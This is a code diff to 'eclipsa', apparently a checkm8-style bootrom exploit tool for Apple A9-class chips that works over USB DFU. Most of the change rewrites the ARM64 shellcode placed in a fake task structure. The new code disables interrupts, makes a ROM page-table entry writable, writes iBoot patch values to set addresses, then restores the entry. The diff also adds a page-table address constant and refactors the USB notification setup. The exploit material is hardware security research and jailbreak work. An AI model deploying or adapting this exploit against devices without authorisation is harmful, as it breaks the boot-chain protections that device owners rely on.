@@ -34,11 +34,12 @@
 #	define PATCH_VAL_4 (0xD503201F) /* nop */
 #elif CPID == 0x8000 || CPID == 0x8003
 #	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
+#	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
 #	define ARCH_TASK_TRAMP_ADDR (0x10000D998)
 #	define IO_BUFFER_ADDR (0x18010D500)
 #	if CPID == 0x8000
 #		define SRTG "iBoot-2234.0.0.3.3"
-#	elif CPID == 0x8003
+#	else
 #		define SRTG "iBoot-2234.0.0.2.22"
 #	endif
 #	define PATCH_ADDR_0 (0x100007924)
@@ -296,6 +297,7 @@ checkm8_stage_setup(handle_t *handle) {
 static kern_return_t
 checkm8_stage_patch(handle_t *handle) {
 	dfu_overwrite_t overwrite;
+	UInt32 *shc;
 
 	memset(&overwrite, '\0', sizeof(overwrite));
 	overwrite.synopsys_task.id = 5;
@@ -314,23 +316,50 @@ checkm8_stage_patch(handle_t *handle) {
 	overwrite.fake_task.state = TASK_RUNNING;
 	overwrite.fake_task.magic_1 = TASK_MAGIC_1;
 	strcpy(overwrite.fake_task.name, "eclipsa");
-	overwrite.fake_task.arch.shc[0] = 0x10000188; /* adr x8, #0x30 */
-	overwrite.fake_task.arch.shc[1] = 0xB8404509; /* ldr w9, [x8], #4 */
-	overwrite.fake_task.arch.shc[2] = 0xB9000269; /* str w9, [x19] */
-	overwrite.fake_task.arch.shc[3] = 0xB8404509; /* ldr w9, [x8], #4 */
-	overwrite.fake_task.arch.shc[4] = 0xB9000289; /* str w9, [x20] */
-	overwrite.fake_task.arch.shc[5] = 0xB8404509; /* ldr w9, [x8], #4 */
-	overwrite.fake_task.arch.shc[6] = 0xB90002A9; /* str w9, [x21] */
-	overwrite.fake_task.arch.shc[7] = 0xB8404509; /* ldr w9, [x8], #4 */
-	overwrite.fake_task.arch.shc[8] = 0xB90002C9; /* str w9, [x22] */
-	overwrite.fake_task.arch.shc[9] = 0xB9400109; /* ldr w9, [x8] */
-	overwrite.fake_task.arch.shc[10] = 0xB90002E9; /* str w9, [x23] */
-	overwrite.fake_task.arch.shc[11] = 0xD65F03C0; /* ret */
-	overwrite.fake_task.arch.shc[12] = PATCH_VAL_0;
-	overwrite.fake_task.arch.shc[13] = PATCH_VAL_1;
-	overwrite.fake_task.arch.shc[14] = PATCH_VAL_2;
-	overwrite.fake_task.arch.shc[15] = PATCH_VAL_3;
-	overwrite.fake_task.arch.shc[16] = PATCH_VAL_4;
+	shc = overwrite.fake_task.arch.shc;
+#if CPID == 0x8000 || CPID == 0x8003
+	overwrite.fake_task.arg = VROM_PAGE_TABLE_ADDR;
+	*shc++ = 0xD50343DF; /* msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF) */
+	*shc++ = 0xD5033FDF; /* isb */
+	*shc++ = 0xF940000A; /* ldr x10, [x0] */
+	*shc++ = 0xB24B054A; /* orr x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
+	*shc++ = 0x9278F94A; /* bic x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
+	*shc++ = 0xF900000A; /* str x10, [x0] */
+	*shc++ = 0xD5033F9F; /* dsb sy */
+	*shc++ = 0xD50E871F; /* tlbi alle3 */
+	*shc++ = 0xD5033F9F; /* dsb sy */
+	*shc++ = 0xD5033FDF; /* isb */
+	*shc++ = 0x100002A8; /* adr x8, #0x54 */
+#else
+	*shc++ = 0x10000188; /* adr x8, #0x30 */
+#endif
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB9000269; /* str w9, [x19] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB9000289; /* str w9, [x20] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB90002A9; /* str w9, [x21] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB90002C9; /* str w9, [x22] */
+	*shc++ = 0xB9400109; /* ldr w9, [x8] */
+	*shc++ = 0xB90002E9; /* str w9, [x23] */
+#if CPID == 0x8000 || CPID == 0x8003
+	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
+	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
+	*shc++ = 0xF900000A; /* str x10, [x0] */
+	*shc++ = 0xD5033F9F; /* dsb sy */
+	*shc++ = 0xD50E871F; /* tlbi alle3 */
+	*shc++ = 0xD5033F9F; /* dsb sy */
+	*shc++ = 0xD5033FDF; /* isb */
+	*shc++ = 0xD50343FF; /* msr DAIFClr, #(DAIFSC_IRQF | DAIFSC_FIQF) */
+	*shc++ = 0xD5033FDF; /* isb */
+#endif
+	*shc++ = 0xD65F03C0; /* ret */
+	*shc++ = PATCH_VAL_0;
+	*shc++ = PATCH_VAL_1;
+	*shc++ = PATCH_VAL_2;
+	*shc++ = PATCH_VAL_3;
+	*shc = PATCH_VAL_4;
 	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
 	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
 	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
@@ -390,12 +419,12 @@ attached_usb_handle(void *refcon, io_iterator_t iter) {
 
 static void
 eclipsa(handle_t *handle) {
+	IONotificationPortRef notify_port = IONotificationPortCreate(kIOMasterPortDefault);
 	CFMutableDictionaryRef matching_dict;
 	CFRunLoopSourceRef run_loop_source;
-	IONotificationPortRef notify_port;
 	io_iterator_t attach_iter;
 
-	if((notify_port = IONotificationPortCreate(kIOMasterPortDefault)) != NULL) {
+	if(notify_port != NULL) {
 		if((run_loop_source = IONotificationPortGetRunLoopSource(notify_port)) != NULL) {
 			CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopDefaultMode);
 			if((matching_dict = IOServiceMatching(kIOUSBDeviceClassName)) != NULL) {
